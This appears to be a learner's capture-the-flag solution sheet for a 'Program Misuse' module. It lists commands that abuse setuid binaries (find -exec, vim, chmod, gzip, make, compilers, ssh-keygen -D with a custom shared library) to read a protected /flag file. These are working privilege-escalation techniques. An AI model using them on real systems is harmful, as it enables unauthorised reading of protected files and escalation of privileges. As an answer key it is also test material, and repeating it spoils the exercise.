# Program Misuse

### level 1

* /challenge/babysuid\_level1
* cat /flag

### level 2

* /challenge/babysuid\_level2
* more /flag

### level 3

* less /flag

### level 4

* tail /flag

### level 5

* head /flag

### level 6

* sort /flag

### level 7

* vim /flag

### level 8

* emacs /flag

### level 9

* nano /flag

### level 10

* rev /flag >> flagrev.txt
* rev flagrev.txt

### level 11

* od -c /flag

### level 12

* hd -c /flag

### level 13

* xxd /flag

### level 14

* base32 /flag
* decode online

### level 15

* base64 /flag
* decode online

### level 16

### level 17

* gzip /flag
* gzip -d -c /flag.gz

### level 18

* bzip2 /flag
* bzip2 -d -c /flag.bz2

### level 19

* zip /flag.zip /flag
* cat /flag.zip

### level 20

### level 21

* ar r /flag.a /flag
* cat /flag.a

### level 22

### level 23

* genisoimage --help 2>&1 | grep FILE | awk {'print $1'} - prints every option that takes FILE as input
* for option in $(genisoimage --help 2>&1 | grep FILE | awk {'print $1'}); do echo $option; genisoimage $option /flag 2>&1 | grep pwn; done

### level 24

### level 25

find /bin/ -name 'd\*' -exec cat /flag \\;

### level 26

```Makefile
all:
        gcc test.c -o test
        cat /flag
```

* make - runs the Makefile and execute the code inside

### level 27

* nice -n 5 cat /flag

### level 28

* timeout 5 cat /flag

### level 29

* stdbuf -oL cat /flag

### level 30

* setarch -R cat /flag

### level 31

### level 34

* awk {'print $0'} /flag

### level 35

* sed 's/""/""/' /flag

### level 36

* ed -v /flag
* ,p

### level 37

* chown 1000 /flag
* cat /flag

### level 38

* chmod 777 /flag
* cat /flag

### level 39

* touch flagcp.txt
* cp /flag flagcp.txt
* cat flagcp.txt

### level 40

* mv /flag flagmv.txt
* login to level1
* cat flagmv.txt OR
* mv /flag /flagmv.txt
* login to level37
* chown 1000 /flag
* cat /flag OR
* mv /flag /flagmv.txt
* login to level38
* chmod 777 /flag
* cat /flag

### level 41

```perl.pl
open(fh, "/flag");
$firstline = <fh>;
print "$firstline\n";
```

* perl perl.pl

### level 42

```python.py
f = open("/flag", "r")  
print(f.read())
```

OR

```python.py
with open("/flag", "r") as flag:
    print(flag.read())
```

* python python.py

### level 43

```ruby.rb
fileObject = File.open("/flag","r");
print(fileObject.read());
fileObject.close();
```

* ruby ruby.rb

### level 44

### level 45

* date -f /flag - prints flag in error message

### level 46

* dmesg -F /flag

### level 47

* wc --files0-from /flag

### level 48

```c.c
#include </flag>

int main {
	puts("Hello");
}
```

* gcc -L / test.c

### level 51

```c.c
include <stdio.h>

int C_GetFunctionList()
{
        FILE *fptr;
        fptr = fopen("/flag", "r");
        char myString[100];
        fgets(myString, 100, fptr);
        printf("%s", myString);
        fclose(fptr);
}

int main()
{
        puts("Hello");
}
```

* gcc c.c -o c -shared -no-pie
* ssh-keygen -D ./c executes the remote c code and prints the flag
